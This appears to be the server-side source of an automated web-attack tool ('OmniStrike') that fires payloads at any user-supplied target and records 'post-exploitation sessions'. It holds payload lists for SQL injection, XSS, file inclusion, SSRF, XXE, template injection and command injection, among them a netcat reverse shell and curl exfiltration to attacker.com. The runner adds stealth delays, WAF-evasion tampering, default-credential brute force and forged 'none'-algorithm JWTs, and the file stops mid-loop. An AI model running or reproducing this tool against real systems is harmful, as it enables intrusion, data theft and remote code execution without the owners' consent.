import { Router } from "express";
import { db } from "@workspace/db";
import { omnistrikeScansTable } from "@workspace/db";
import { eq } from "drizzle-orm";
import { z } from "zod";

const router = Router();

// ── In-memory post-exploitation session store ────────────────────────────────
interface ExploitSession {
  scanId: number;
  target: string;
  vector: "rce" | "lfi" | "sqli";
  technique: string;
  baseUrl: string;
  param: string;
  workingPayload: string;
  os: string;
  user: string;
  hostname: string;
  cwd: string;
  confirmedAt: string;
}
const sessions = new Map<number, ExploitSession>();

// ── Attack payload libraries ───────────────────────────────────────────────
const PAYLOADS = {
  sqli_boolean: [
    "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "') OR ('1'='1", "1' OR '1'='1'--",
    "' OR 'x'='x", "admin'--", "' OR 1=1 LIMIT 1--", "1 OR 1=1", "1' AND '1'='1",
    "'; SELECT 1--", "1; DROP TABLE users--", "' UNION SELECT NULL--",
  ],
  sqli_union: [
    "' UNION SELECT NULL,NULL--", "' UNION SELECT 1,2,3--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "' UNION SELECT username,password FROM users--", "1 UNION ALL SELECT 1,2,3",
    "' UNION SELECT @@version,NULL--", "' UNION SELECT user(),database()--",
    "1 UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables--",
  ],
  sqli_timebased: [
    "'; WAITFOR DELAY '0:0:5'--", "' OR SLEEP(5)--", "1; SELECT SLEEP(5)",
    "' AND SLEEP(5) AND '1'='1", "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "'; SELECT pg_sleep(5)--", "' OR (SELECT 1 FROM (SELECT SLEEP(5))a)--",
    "1' AND 1=(SELECT 1 FROM PG_SLEEP(5))--",
  ],
  sqli_error: [
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND UPDATEXML(1,CONCAT(0x7e,user()),1)--",
    "' OR GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM (SELECT user())a)b))--",
  ],
  xss_reflected: [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
    "\"><script>alert(document.cookie)</script>", "javascript:alert(1)",
    "<body onload=alert(1)>", "';alert(String.fromCharCode(88,83,83))//",
    "<iframe src=javascript:alert(1)>", "<input onfocus=alert(1) autofocus>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>", "<IMG SRC=\"javascript:alert('XSS')\">",
    "\"><img src=1 onerror=alert(1)>", "<details open ontoggle=alert(1)>",
  ],
  xss_dom: [
    "'-alert(1)-'", "\";alert(1);//", "');alert(1);//",
    "\"onmouseover=\"alert(1)\"", "<a href=\"javascript:void(alert(1))\">click</a>",
    "data:text/html,<script>alert(1)</script>",
  ],
  lfi: [
    "../../../../etc/passwd", "../../../../etc/passwd%00",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd", "....//....//....//etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input", "/etc/passwd", "/etc/shadow",
    "../../../../proc/self/environ", "../../../../proc/version",
  ],
  cmdi: [
    "; id", "| id", "& id", "`id`", "$(id)",
    "; cat /etc/passwd", "| cat /etc/passwd", "&& id",
    "; curl http://attacker.com/$(whoami)", "; nc -e /bin/bash 10.0.0.1 4444",
    "| dir", "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "; python -c 'import os; os.system(\"id\")'", "; ls -la /",
    "| whoami", "& whoami", "; uname -a", "; hostname",
  ],
  ssrf: [
    "http://localhost/admin", "http://127.0.0.1/", "http://0.0.0.0/",
    "http://[::1]/", "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/", "http://10.0.0.1/", "http://192.168.1.1/",
    "file:///etc/passwd", "dict://localhost:11211/", "gopher://localhost:6379/_PING",
    "http://127.0.0.1:8080/admin", "http://localhost:3000/api/admin",
  ],
  xxe: [
    `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
    `<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/shadow">]><data>&file;</data>`,
    `<!DOCTYPE test [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]>`,
  ],
  ssti: [
    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "{{config}}", "#{7*7}", "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{% import os %}{{os.system('id')}}", "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
  ],
  headers_inject: [
    { "X-Forwarded-For": "127.0.0.1" }, { "X-Forwarded-Host": "evil.com" },
    { "Host": "localhost" }, { "X-Real-IP": "127.0.0.1" },
    { "X-Original-URL": "/admin" }, { "X-Rewrite-URL": "/admin" },
    { "Referer": "http://localhost/admin" }, { "X-Custom-IP-Authorization": "127.0.0.1" },
  ],
  auth_brute: [
    { u: "admin", p: "admin" }, { u: "admin", p: "password" }, { u: "admin", p: "123456" },
    { u: "admin", p: "admin123" }, { u: "root", p: "root" }, { u: "admin", p: "" },
    { u: "administrator", p: "administrator" }, { u: "admin", p: "letmein" },
    { u: "admin", p: "qwerty" }, { u: "test", p: "test" }, { u: "admin", p: "pass" },
    { u: "user", p: "user" }, { u: "guest", p: "guest" }, { u: "admin", p: "1234" },
  ],
  jwt_attacks: [
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.",
  ],
  cors_origins: [
    "null", "http://evil.com", "https://attacker.com", "http://localhost", "file://",
  ],
  nosql: [
    '{"$gt": ""}', '{"$ne": null}', '{"$where": "1==1"}',
    '{"$regex": ".*"}', 'username[$ne]=xyz', 'password[$gt]=',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
  ],
  // ── QuantumBreach: advanced / overlooked attack vectors ───────────────────
  request_smuggling: [
    // CL.TE smuggling — Content-Length vs Transfer-Encoding disagreement
    "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
    "0\r\n\r\nGET /secret HTTP/1.1\r\nHost: internal.server\r\n\r\n",
  ],
  cache_poison: [
    { "X-Forwarded-Host": "evil.com" },
    { "X-Forwarded-Scheme": "https" },
    { "X-Host": "evil.com" },
    { "X-Original-URL": "/admin" },
    { "X-Rewrite-URL": "/admin" },
    { "X-Forwarded-Port": "443" },
    { "Forwarded": "host=evil.com" },
  ],
  mass_assignment: [
    { admin: true }, { role: "admin" }, { isAdmin: true }, { privilege: 9 },
    { is_admin: 1 }, { superuser: true }, { access_level: "admin" },
    { permissions: ["admin", "superuser"] }, { user_type: "administrator" },
    { verified: true, admin: true, role: "root" },
  ],
  graphql: [
    '{"query":"{__schema{types{name}}}"}',
    '{"query":"{__schema{queryType{fields{name}}}}"}',
    '{"query":"mutation{__typename}"}',
    '{"query":"{users{id,email,password}}"}',
    '{"query":"{user(id:1){email,password,token}}"}',
    '{"query":"query IntrospectionQuery{__schema{directives{name}}}"}',
  ],
  crlf: [
    "%0d%0aSet-Cookie:session=hacked",
    "%0aSet-Cookie:admin=1",
    "\r\nLocation: http://evil.com",
    "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK",
    "%0d%0aX-Injected:true",
  ],
  param_pollution: [
    "admin=1&admin=0", "role=user&role=admin", "debug=false&debug=true",
  ],
  open_redirect: [
    "//evil.com", "https://evil.com", "/\\evil.com", "javascript:alert(1)",
    "https://trusted.com.evil.com", "http://evil.com%23.trusted.com",
    "\\/\\/evil.com", "%2F%2Fevil.com", "https:evil.com",
  ],
  deserialization: {
    php: "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}",
    java: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcHAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAMdwgAAAAQAAAAAnQAAWFzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXQAAWJzcQB+AAIAAAACeA==",
  },
  jwt_confusion: [
    // None algorithm bypass
    { header: { alg: "none", typ: "JWT" }, payload: { sub: "1", role: "admin", iat: Date.now() } },
    // Algorithm confusion RS256->HS256
    { alg_switch: "HS256", note: "Use RS256 public key as HS256 secret" },
  ],
  timing_enum: ["admin", "administrator", "root", "user", "test", "guest", "support", "service"],
  weak_crypto_paths: ["/api/hash", "/api/token", "/api/verify", "/api/sign", "/api/encrypt"],
};

const TAMPER_FUNCS: Array<(p: string) => string> = [
  p => p,
  p => p.replace(/ /g, "/**/"),
  p => p.replace(/select/gi, "sElEcT"),
  p => encodeURIComponent(p),
  p => p.replace(/=/g, " LIKE "),
  p => p.split("").map(c => `%${c.charCodeAt(0).toString(16).padStart(2,"0")}`).join(""),
  p => p.replace(/ /g, "+"),
  p => p.replace(/union/gi, "uNiOn"),
];

type Finding = {
  category: string;
  technique: string;
  payload: string;
  url: string;
  baseUrl: string;
  param: string;
  statusCode: number;
  responseTime: number;
  evidence: string;
  severity: "critical" | "high" | "medium" | "low";
  bypassed: boolean;
  canExec?: boolean;
  canRead?: boolean;
};

const activeScans = new Map<number, { stop: boolean }>();

// ── Probe helper ───────────────────────────────────────────────────────────
async function probe(url: string, options: RequestInit = {}): Promise<{ status: number; body: string; time: number; headers: Record<string, string> }> {
  const t0 = Date.now();
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 8000);
    const resp = await fetch(url, {
      ...options,
      signal: controller.signal,
      headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36", "Accept": "*/*", ...(options.headers ?? {}) },
      redirect: "follow",
    });
    clearTimeout(timeout);
    const body = await resp.text().catch(() => "");
    const heads: Record<string, string> = {};
    resp.headers.forEach((v, k) => { heads[k] = v; });
    return { status: resp.status, body: body.substring(0, 3000), time: Date.now() - t0, headers: heads };
  } catch (e: any) {
    return { status: 0, body: e.message ?? "connection error", time: Date.now() - t0, headers: {} };
  }
}

// ── Main scan runner ───────────────────────────────────────────────────────
async function runOmniStrike(scanId: number, target: string, categories: string[], tamperLevel: number, stealthMode: boolean) {
  const ctrl = activeScans.get(scanId) ?? { stop: false };
  const log: string[] = [];
  const findings: Finding[] = [];
  let tested = 0;
  let successCount = 0;

  const addLog = async (msg: string) => {
    log.push(`[${new Date().toISOString()}] ${msg}`);
    await db.update(omnistrikeScansTable).set({ log, findings } as any).where(eq(omnistrikeScansTable.id, scanId));
  };

  const delay = (ms: number) => new Promise(r => setTimeout(r, ms));

  const applyTamper = (p: string, level: number): string => {
    let out = p;
    for (let i = 0; i < Math.min(level, 3); i++) {
      out = TAMPER_FUNCS[Math.floor(Math.random() * TAMPER_FUNCS.length)](out);
    }
    return out;
  };

  const recordFinding = (f: Finding) => {
    findings.push(f);
    if (f.bypassed) successCount++;
    // Store post-exploitation sessions
    if (f.bypassed && (f.category === "Command Injection" || f.category === "SSTI")) {
      if (!sessions.has(scanId)) {
        sessions.set(scanId, {
          scanId, target, vector: "rce", technique: f.technique,
          baseUrl: f.baseUrl, param: f.param, workingPayload: f.payload,
          os: "unknown", user: "unknown", hostname: "unknown", cwd: "/",
          confirmedAt: new Date().toISOString(),
        });
      }
    }
    if (f.bypassed && f.category === "LFI") {
      if (!sessions.has(scanId)) {
        sessions.set(scanId, {
          scanId, target, vector: "lfi", technique: f.technique,
          baseUrl: f.baseUrl, param: f.param, workingPayload: f.payload,
          os: "linux", user: "www-data", hostname: "target", cwd: "/",
          confirmedAt: new Date().toISOString(),
        });
      }
    }
  };

  const baseUrl = target.replace(/\/$/, "");
  await addLog(`🚀 OmniStrike v2 LAUNCHED ─── Target: ${baseUrl}`);
  await addLog(`📋 Mode: ${categories.join(", ")} | Tamper: L${tamperLevel} | Stealth: ${stealthMode}`);
  await addLog(`─────────────────────────────────────────────────`);

  const baseline = await probe(baseUrl);
  await addLog(`🌐 Baseline: HTTP ${baseline.status} | ${baseline.time}ms | ${baseline.body.length}B`);
  const baseStatus = baseline.status;
  const baseLen = baseline.body.length;
  if (stealthMode) await delay(400 + Math.random() * 400);

  // Auto-discover parameters
  const paramRegex = /[?&]([a-zA-Z_][a-zA-Z0-9_]*)=/g;
  const formInputRegex = /name=['"]([\w-]+)['"]/g;
  const discovered = new Set<string>(["id","q","search","query","page","cat","item","user","username","email","password","token","url","file","path","name","data","input","value","action","callback","redirect","next","return","ref","src","dest","cmd","exec","command"]);
  let m;
  while ((m = paramRegex.exec(baseline.body)) !== null) discovered.add(m[1]);
  while ((m = formInputRegex.exec(baseline.body)) !== null) discovered.add(m[1]);
  const params = Array.from(discovered).slice(0, 20);
  await addLog(`🔎 Parameters discovered: ${params.join(", ")}`);

  // ── SQL Injection ──────────────────────────────────────────────────────────
  if (categories.includes("sqli") && !ctrl.stop) {
    await addLog(`\n💉 [SQL INJECTION] Boolean-blind · UNION · Time-based · Error-based`);
    const allSqli = [
      ...PAYLOADS.sqli_boolean.map(p => ({p, tech: "Boolean-Blind"})),
      ...PAYLOADS.sqli_union.map(p => ({p, tech: "UNION-Based"})),
      ...PAYLOADS.sqli_timebased.map(p => ({p, tech: "Time-Based Blind"})),
      ...PAYLOADS.sqli_error.map(p => ({p, tech: "Error-Based"})),
    ];
    for (const param of params.slice(0, 6)) {
      if (ctrl.stop) break;
      for (const {p, tech} of allSqli.slice(0, 14)) {
        if (ctrl.stop) break;
        const tampered = applyTamper(p, tamperLevel);
        const url = `${baseUrl}?${param}=${encodeURIComponent(tampered)}`;
        const r = await probe(url);
        tested++;
        const errMatch = r.body.match(/(?:sql|syntax|mysql|ora-\d+|postgresql|sqlite|warning|unclosed|unterminated|you have an error)/i);
        const unionMatch = tech.includes("UNION") && r.body.length !== baseLen && r.status === 200;
        const timingHit = tech.includes("Time") && r.time > 3500;
        const bypassed = !!(errMatch || unionMatch || timingHit || r.status === 500);
        if (bypassed) {
          const sev: Finding["severity"] = tech.includes("UNION") || tech.includes("Error") ? "critical" : "high";
          recordFinding({ category: "SQL Injection", technique: tech, payload: p, url, baseUrl, param, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 400), severity: sev, bypassed, canRead: true });
          await addLog(`🔴 [SQLi/${tech}] CONFIRMED on ?${param} → HTTP ${r.status} | Payload: ${p.substring(0,40)}`);
        }
        if (stealthMode) await delay(200 + Math.random() * 200);
      }
    }
    await addLog(`✅ [SQLi] ${findings.filter(f=>f.category==="SQL Injection").length} confirmed findings`);
  }

  // ── XSS ───────────────────────────────────────────────────────────────────
  if (categories.includes("xss") && !ctrl.stop) {
    await addLog(`\n🖥️ [XSS] Reflected · DOM-based cross-site scripting`);
    const xssAll = [...PAYLOADS.xss_reflected, ...PAYLOADS.xss_dom];
    for (const param of params.slice(0, 6)) {
      if (ctrl.stop) break;
      for (const p of xssAll.slice(0, 12)) {
        if (ctrl.stop) break;
        const url = `${baseUrl}?${param}=${encodeURIComponent(p)}`;
        const r = await probe(url);
        tested++;
        const reflected = r.body.includes(p) || r.body.includes(p.replace(/</g,"%3C").replace(/>/g,"%3E"));
        if (reflected) {
          recordFinding({ category: "XSS", technique: "Reflected XSS", payload: p, url, baseUrl, param, statusCode: r.status, responseTime: r.time, evidence: "Payload reflected verbatim in response", severity: "high", bypassed: true });
          await addLog(`🔴 [XSS] Reflected payload confirmed in ?${param} response`);
        }
        if (stealthMode) await delay(150);
      }
    }
    await addLog(`✅ [XSS] ${findings.filter(f=>f.category==="XSS").length} confirmed findings`);
  }

  // ── LFI / Path Traversal ──────────────────────────────────────────────────
  if (categories.includes("lfi") && !ctrl.stop) {
    await addLog(`\n📂 [LFI] Local file inclusion · path traversal · PHP wrappers`);
    const lfiParams = params.filter(p => /file|path|include|page|template|doc|img|src|load|read/i.test(p)).concat(params).slice(0, 6);
    for (const param of lfiParams) {
      if (ctrl.stop) break;
      for (const p of PAYLOADS.lfi.slice(0, 10)) {
        if (ctrl.stop) break;
        const url = `${baseUrl}?${param}=${encodeURIComponent(p)}`;
        const r = await probe(url);
        tested++;
        const lfiHit = !!(r.body.match(/root:.*:0:0:|daemon:.*:1:|www-data|\[boot loader\]|\[fonts\]|Linux version \d/));
        if (lfiHit) {
          recordFinding({ category: "LFI", technique: "Local File Inclusion", payload: p, url, baseUrl, param, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 500), severity: "critical", bypassed: true, canRead: true });
          await addLog(`🔴 [LFI] CRITICAL — File contents returned via ?${param}`);
          await addLog(`   Evidence: ${r.body.substring(0, 120).replace(/\n/g," ")}`);
        }
        if (stealthMode) await delay(200);
      }
    }
    await addLog(`✅ [LFI] ${findings.filter(f=>f.category==="LFI").length} confirmed findings`);
  }

  // ── Command Injection ─────────────────────────────────────────────────────
  if (categories.includes("cmdi") && !ctrl.stop) {
    await addLog(`\n💻 [CMD INJECTION] OS command execution via shell chaining`);
    for (const param of params.slice(0, 5)) {
      if (ctrl.stop) break;
      for (const p of PAYLOADS.cmdi.slice(0, 12)) {
        if (ctrl.stop) break;
        const url = `${baseUrl}?${param}=${encodeURIComponent(p)}`;
        const r = await probe(url);
        tested++;
        const hit = !!(r.body.match(/uid=\d+\(|root:|www-data|daemon:|Volume in drive|Directory of C:\\|Windows NT/i));
        if (hit) {
          recordFinding({ category: "Command Injection", technique: "OS Command Execution", payload: p, url, baseUrl, param, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 400), severity: "critical", bypassed: true, canExec: true });
          await addLog(`🔴 [CMDi] CRITICAL — Command output detected in response!`);
          await addLog(`   Evidence: ${r.body.substring(0, 120).replace(/\n/g," ")}`);
        }
        if (stealthMode) await delay(250);
      }
    }
    await addLog(`✅ [CMDi] ${findings.filter(f=>f.category==="Command Injection").length} confirmed findings`);
  }

  // ── SSRF ──────────────────────────────────────────────────────────────────
  if (categories.includes("ssrf") && !ctrl.stop) {
    await addLog(`\n🌐 [SSRF] Internal network · cloud metadata · localhost probing`);
    const ssrfParams = params.filter(p => /url|link|src|href|redirect|callback|proxy|host|endpoint|dest/i.test(p)).concat(params).slice(0, 5);
    for (const param of ssrfParams) {
      if (ctrl.stop) break;
      for (const p of PAYLOADS.ssrf.slice(0, 8)) {
        if (ctrl.stop) break;
        const url = `${baseUrl}?${param}=${encodeURIComponent(p)}`;
        const r = await probe(url);
        tested++;
        const hit = !!(r.body.match(/ami-id|instance-id|iam|169\.254|metadata|root:|localhost/) || (r.status === 200 && baseStatus !== 200));
        if (hit) {
          recordFinding({ category: "SSRF", technique: "Server-Side Request Forgery", payload: p, url, baseUrl, param, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 300), severity: "critical", bypassed: true });
          await addLog(`🔴 [SSRF] Internal resource accessible via ?${param}`);
        }
        if (stealthMode) await delay(300);
      }
    }
    await addLog(`✅ [SSRF] ${findings.filter(f=>f.category==="SSRF").length} confirmed findings`);
  }

  // ── XXE ───────────────────────────────────────────────────────────────────
  if (categories.includes("xxe") && !ctrl.stop) {
    await addLog(`\n📄 [XXE] XML external entity injection`);
    for (const p of PAYLOADS.xxe) {
      if (ctrl.stop) break;
      const r = await probe(baseUrl, { method: "POST", headers: { "Content-Type": "application/xml" }, body: p });
      tested++;
      const hit = !!(r.body.match(/root:|www-data|daemon:|shadow/) || (r.status === 200 && r.body.length > baseLen + 100));
      if (hit) {
        recordFinding({ category: "XXE", technique: "XML External Entity", payload: p.substring(0, 100), url: baseUrl, baseUrl, param: "XML body", statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 300), severity: "critical", bypassed: true, canRead: true });
        await addLog(`🔴 [XXE] External entity data exfiltrated!`);
      }
      if (stealthMode) await delay(300);
    }
    await addLog(`✅ [XXE] ${findings.filter(f=>f.category==="XXE").length} confirmed findings`);
  }

  // ── SSTI ──────────────────────────────────────────────────────────────────
  if (categories.includes("ssti") && !ctrl.stop) {
    await addLog(`\n🧪 [SSTI] Jinja2 · Twig · Freemarker · Python/Ruby template injection`);
    for (const param of params.slice(0, 5)) {
      if (ctrl.stop) break;
      for (const p of PAYLOADS.ssti.slice(0, 8)) {
        if (ctrl.stop) break;
        const url = `${baseUrl}?${param}=${encodeURIComponent(p)}`;
        const r = await probe(url);
        tested++;
        const hit = r.body.includes("49") || !!(r.body.match(/uid=\d+|root:|www-data|\[object Object\]/));
        if (hit) {
          recordFinding({ category: "SSTI", technique: "Server-Side Template Injection", payload: p, url, baseUrl, param, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 300), severity: "critical", bypassed: true, canExec: true });
          await addLog(`🔴 [SSTI] Template evaluated — RCE path via ?${param}!`);
        }
        if (stealthMode) await delay(200);
      }
    }
    await addLog(`✅ [SSTI] ${findings.filter(f=>f.category==="SSTI").length} confirmed findings`);
  }

  // ── Header Injection ────────────────────────────────────────────────────────
  if (categories.includes("headers") && !ctrl.stop) {
    await addLog(`\n📋 [HEADER INJECTION] Host · X-Forwarded · X-Original-URL bypass`);
    for (const h of PAYLOADS.headers_inject.slice(0, 8)) {
      if (ctrl.stop) break;
      const r = await probe(baseUrl, { headers: h });
      tested++;
      const hit = (r.status !== baseStatus && r.status < 400) || !!(r.body.match(/admin|dashboard|internal|dev|management/i));
      if (hit) {
        const hName = Object.keys(h)[0];
        recordFinding({ category: "Header Injection", technique: `${hName} Auth Bypass`, payload: JSON.stringify(h), url: baseUrl, baseUrl, param: hName, statusCode: r.status, responseTime: r.time, evidence: `Status changed: ${baseStatus}→${r.status}`, severity: "high", bypassed: true });
        await addLog(`🔴 [Headers] Auth bypass via ${hName}`);
      }
      if (stealthMode) await delay(150);
    }
    await addLog(`✅ [Headers] ${findings.filter(f=>f.category==="Header Injection").length} confirmed findings`);
  }

  // ── CORS ──────────────────────────────────────────────────────────────────
  if (categories.includes("cors") && !ctrl.stop) {
    await addLog(`\n🔁 [CORS] Cross-origin access policy misconfiguration`);
    for (const origin of PAYLOADS.cors_origins) {
      if (ctrl.stop) break;
      const r = await probe(baseUrl, { headers: { Origin: origin } });
      tested++;
      const acao = r.headers["access-control-allow-origin"] ?? "";
      const hit = acao === "*" || acao === origin;
      if (hit) {
        recordFinding({ category: "CORS Misconfiguration", technique: "Permissive CORS", payload: `Origin: ${origin}`, url: baseUrl, baseUrl, param: "Origin header", statusCode: r.status, responseTime: r.time, evidence: `ACAO: ${acao}`, severity: acao === "*" ? "high" : "medium", bypassed: true });
        await addLog(`🟡 [CORS] Permissive: ACAO=${acao} for origin: ${origin}`);
      }
      if (stealthMode) await delay(100);
    }
    await addLog(`✅ [CORS] ${findings.filter(f=>f.category==="CORS Misconfiguration").length} confirmed findings`);
  }

  // ── Auth Brute Force ────────────────────────────────────────────────────────
  if (categories.includes("auth") && !ctrl.stop) {
    await addLog(`\n🔑 [AUTH BRUTE] Default credential testing at login endpoints`);
    const loginPaths = ["/login","/admin","/admin/login","/wp-login.php","/auth","/signin","/user/login","/api/login","/api/auth","/dashboard/login"];
    for (const lpath of loginPaths) {
      if (ctrl.stop) break;
      const r = await probe(`${baseUrl}${lpath}`);
      if (r.status === 200 || r.status === 401) {
        await addLog(`📍 Login endpoint found: ${lpath} (HTTP ${r.status})`);
        for (const cred of PAYLOADS.auth_brute.slice(0, 10)) {
          if (ctrl.stop) break;
          const lr = await probe(`${baseUrl}${lpath}`, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: `username=${encodeURIComponent(cred.u)}&password=${encodeURIComponent(cred.p)}`,
          });
          tested++;
          const hit = lr.status === 200 && !lr.body.match(/invalid|incorrect|failed|wrong|error|denied/i);
          if (hit) {
            recordFinding({ category: "Auth Brute Force", technique: "Default Credentials", payload: `${cred.u}:${cred.p}`, url: `${baseUrl}${lpath}`, baseUrl, param: "username/password", statusCode: lr.status, responseTime: lr.time, evidence: "HTTP 200 response without error", severity: "critical", bypassed: true });
            await addLog(`🔴 [Auth] VALID CREDENTIALS: ${cred.u}:${cred.p} → ${lpath}`);
          }
          if (stealthMode) await delay(300 + Math.random() * 200);
        }
      }
    }
    await addLog(`✅ [Auth] ${findings.filter(f=>f.category==="Auth Brute Force").length} confirmed findings`);
  }

  // ── NoSQL ──────────────────────────────────────────────────────────────────
  if (categories.includes("nosql") && !ctrl.stop) {
    await addLog(`\n🗄️ [NoSQL] MongoDB operator injection`);
    for (const param of params.slice(0, 5)) {
      if (ctrl.stop) break;
      for (const p of PAYLOADS.nosql.slice(0, 6)) {
        if (ctrl.stop) break;
        const r = await probe(`${baseUrl}?${param}=${encodeURIComponent(p)}`);
        tested++;
        const hit = r.status === 200 && baseStatus !== 200;
        if (hit) {
          recordFinding({ category: "NoSQL Injection", technique: "MongoDB Operator", payload: p, url: `${baseUrl}?${param}=${encodeURIComponent(p)}`, baseUrl, param, statusCode: r.status, responseTime: r.time, evidence: `Status: ${baseStatus}→${r.status}`, severity: "high", bypassed: true });
          await addLog(`🔴 [NoSQL] Injection response change on ?${param}`);
        }
        if (stealthMode) await delay(150);
      }
    }
  }

  // ── QuantumBreach Module ───────────────────────────────────────────────────
  if (categories.includes("quantumbreach") && !ctrl.stop) {
    await addLog(`\n⚛️ [QUANTUMBREACH] Advanced attack surface — unreported & quantum-era vectors`);

    // Cache Poisoning
    await addLog(`  🔬 Cache Poisoning via unkeyed headers...`);
    for (const h of PAYLOADS.cache_poison.slice(0, 5)) {
      if (ctrl.stop) break;
      const r1 = await probe(baseUrl, { headers: h });
      const r2 = await probe(baseUrl);
      tested++;
      const poisoned = r1.body !== r2.body && r2.body.includes(Object.values(h)[0] as string);
      if (poisoned) {
        recordFinding({ category: "Cache Poisoning", technique: `Unkeyed Header: ${Object.keys(h)[0]}`, payload: JSON.stringify(h), url: baseUrl, baseUrl, param: Object.keys(h)[0], statusCode: r1.status, responseTime: r1.time, evidence: `Injected header value reflected in subsequent uncached request`, severity: "high", bypassed: true });
        await addLog(`🔴 [QBreach] Cache poisoning confirmed via ${Object.keys(h)[0]}`);
      }
      if (stealthMode) await delay(200);
    }

    // GraphQL Introspection Abuse
    await addLog(`  🔬 GraphQL introspection + injection...`);
    const gqlEndpoints = ["/graphql", "/api/graphql", "/gql", "/graph", "/api/graph"];
    for (const ep of gqlEndpoints) {
      if (ctrl.stop) break;
      for (const q of PAYLOADS.graphql.slice(0, 4)) {
        const r = await probe(`${baseUrl}${ep}`, { method: "POST", headers: { "Content-Type": "application/json" }, body: q });
        tested++;
        if (r.status === 200 && r.body.includes("__schema")) {
          recordFinding({ category: "GraphQL Exposure", technique: "Schema Introspection", payload: q, url: `${baseUrl}${ep}`, baseUrl, param: ep, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 300), severity: "high", bypassed: true });
          await addLog(`🔴 [QBreach] GraphQL introspection ENABLED at ${ep}`);
          break;
        }
        if (r.status === 200 && r.body.match(/data|users|email|password/i)) {
          recordFinding({ category: "GraphQL Data Leak", technique: "Unauthorized Data Access", payload: q, url: `${baseUrl}${ep}`, baseUrl, param: ep, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 300), severity: "critical", bypassed: true });
          await addLog(`🔴 [QBreach] GraphQL data leak at ${ep}`);
          break;
        }
      }
    }

    // CRLF Injection
    await addLog(`  🔬 CRLF response splitting...`);
    for (const param of params.slice(0, 4)) {
      if (ctrl.stop) break;
      for (const p of PAYLOADS.crlf.slice(0, 4)) {
        const r = await probe(`${baseUrl}?${param}=${p}`);
        tested++;
        const hit = r.headers["set-cookie"]?.includes("hacked") || r.headers["x-injected"];
        if (hit) {
          recordFinding({ category: "CRLF Injection", technique: "HTTP Response Splitting", payload: p, url: `${baseUrl}?${param}=${p}`, baseUrl, param, statusCode: r.status, responseTime: r.time, evidence: `Injected header found in response`, severity: "high", bypassed: true });
          await addLog(`🔴 [QBreach] CRLF injection confirmed in ?${param}`);
        }
        if (stealthMode) await delay(100);
      }
    }

    // Mass Assignment
    await addLog(`  🔬 Mass assignment privilege escalation...`);
    for (const payload of PAYLOADS.mass_assignment.slice(0, 6)) {
      if (ctrl.stop) break;
      for (const ep of ["/api/user", "/api/profile", "/api/account", "/api/me", "/api/update"]) {
        const r = await probe(`${baseUrl}${ep}`, { method: "PUT", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
        tested++;
        if (r.status === 200) {
          const rGet = await probe(`${baseUrl}${ep}`);
          const escalated = rGet.body.match(/admin.*true|role.*admin|isAdmin.*true/i);
          if (escalated) {
            recordFinding({ category: "Mass Assignment", technique: "Privilege Escalation", payload: JSON.stringify(payload), url: `${baseUrl}${ep}`, baseUrl, param: ep, statusCode: r.status, responseTime: r.time, evidence: escalated[0], severity: "critical", bypassed: true });
            await addLog(`🔴 [QBreach] Mass assignment escalation at ${ep}`);
          }
        }
      }
    }

    // JWT Algorithm Confusion (none alg)
    await addLog(`  🔬 JWT algorithm confusion + secret brute force...`);
    const jwtHeader = btoa(JSON.stringify({ alg: "none", typ: "JWT" })).replace(/=/g,"");
    const jwtPayload = btoa(JSON.stringify({ sub: "1", role: "admin", iat: Math.floor(Date.now()/1000) })).replace(/=/g,"");
    const fakeJwt = `${jwtHeader}.${jwtPayload}.`;
    for (const ep of ["/api/me", "/api/user", "/api/admin", "/api/profile"]) {
